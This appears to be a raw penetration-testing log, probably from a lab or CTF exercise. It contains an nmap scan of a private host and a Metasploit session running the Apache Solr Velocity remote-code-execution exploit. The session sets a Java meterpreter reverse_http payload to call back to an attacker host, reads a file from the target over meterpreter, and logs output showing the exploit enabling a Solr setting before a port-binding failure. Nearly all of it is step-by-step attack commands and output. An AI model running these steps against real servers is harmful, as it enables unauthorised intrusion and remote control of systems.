
└──╼ #nmap -sV -A -p- 172.20.4.88
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-26 12:44 CDT
Nmap scan report for 172.20.4.88
Host is up (0.00092s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 72:f3:36:e3:82:44:5f:cc:af:1a:eb:ad:9d:c1:0f:5b (RSA)
|   256 74:97:ec:65:4f:3d:86:5e:dd:76:65:86:60:67:a8:c4 (ECDSA)
|_  256 24:b2:a7:4a:6e:ea:75:ff:d4:af:ea:32:dd:2f:96:34 (ED25519)
8983/tcp  open  http     Apache Solr
| http-title: Solr Admin
|_Requested resource was http://172.20.4.88:8983/solr/
18983/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:18983
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
41183/tcp open  java-rmi Java RMI
MAC Address: 52:54:00:E7:12:AC (QEMU virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




msf6 > search http solr
msf6 > use exploit/multi/http/solr_velocity_rce
msf6 exploit(multi/http/solr_velocity_rce) > show options
msf6 exploit(multi/http/solr_velocity_rce) > set RHOSTS 172.20.4.88
msf6 exploit(multi/http/solr_velocity_rce) > show payloads
msf6 exploit(multi/http/solr_velocity_rce) > set PAYLOAD payload/java/meterpreter/reverse_http
msf6 exploit(multi/http/solr_velocity_rce) > set LHOST 172.20.4.47
msf6 exploit(multi/http/solr_velocity_rce) > show options
msf6 exploit(multi/http/solr_velocity_rce) > exploit -j

msf6 exploit(multi/http/solr_velocity_rce) > set SRVPORT 8081
msf6 exploit(multi/http/solr_velocity_rce) > show options
msf6 exploit(multi/http/solr_velocity_rce) > exploit -j

msf6 exploit(multi/http/solr_velocity_rce) > sessions
msf6 exploit(multi/http/solr_velocity_rce) > sessions -i 1

meterpreter > getuid
meterpreter > cat /home/favorite_book.txt
meterpreter > sysinfo



!!! exploit -j Error !!!

msf6 exploit(multi/http/solr_velocity_rce) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://172.20.4.47:8080
msf6 exploit(multi/http/solr_velocity_rce) > [*] 172.20.4.88:8983: Authentication not required
[*] Found Apache Solr 8.2.0
[*] OS version is Linux amd64 5.10.0-27-amd64
[*] Found core(s): novacollection
[+] Found Velocity Response Writer in use by core 'novacollection'
[!] params.resource.loader.enabled for core 'novacollection' is set to false.
[*] Targeting core 'novacollection'
[*] params.resource.loader.enabled is false for 'novacollection', trying to update it...
[+] params.resource.loader.enabled is true for core 'novacollection'
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
Interrupt: use the 'exit' command to quit

>>> [-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080)
